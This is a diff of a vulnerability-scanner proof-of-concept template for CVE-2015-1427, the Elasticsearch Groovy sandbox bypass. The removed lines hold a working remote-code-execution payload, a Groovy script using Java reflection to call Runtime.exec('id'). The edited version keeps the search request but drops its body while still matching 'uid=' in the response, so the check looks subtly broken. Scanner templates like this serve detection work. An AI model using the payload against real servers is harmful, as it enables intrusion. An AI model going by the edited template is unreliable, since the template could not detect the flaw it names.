@@ -1,14 +1,14 @@
 [info]
-author = "AVE"
-description = "Elasticsearch 1.3.8/1.4.3 之前版本 Groovy 沙箱绕过漏洞检测。通过先创建索引文档，再向 _search API 发送包含恶意 Groovy 脚本的 script_fields 请求，利用 Java 反射绕过沙箱执行系统命令，根据响应中是否包含命令执行结果判断漏洞是否存在。"
+author = "ave"
+description = "AVE-2015-0009 Groovy 沙箱绕过导致远程代码执行 PoC"
 id = "POC-AVE-2015-0009"
-name = "Elasticsearch Groovy 沙箱绕过远程代码执行漏洞 PoC"
-severity = "critical"
+name = "CVE-2015-1427 Elasticsearch Groovy Sandbox Bypass PoC"
+severity = "high"
 tags = [
     "cve-2015-1427",
     "elasticsearch",
-    "rce",
     "groovy",
+    "rce",
 ]
 vuln_id = [
     "CVE-2015-1427",
@@ -20,40 +20,14 @@ logic = "all"
 
 [[poc.requests]]
 method = "POST"
-path = "/{{BaseURL}}/website/blog/"
-protocol = "http"
-
-[poc.requests.body]
-content = '{"name":"test"}'
-type = "raw"
-
-[poc.requests.headers]
-Content-Type = "application/x-www-form-urlencoded"
-
-[[poc.requests.matchers]]
-expect = true
-status = [201]
-type = "status"
-
-[[poc.requests]]
-method = "POST"
 path = "/{{BaseURL}}/_search"
 protocol = "http"
 
 [poc.requests.body]
-content = '{"size":1,"script_fields":{"lupin":{"lang":"groovy","script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}'
-type = "raw"
-
-[poc.requests.headers]
-Content-Type = "application/json"
+type = "json"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = ["uid="]
-
-[[poc.requests.matchers]]
-expect = true
-status = [200]
-type = "status"
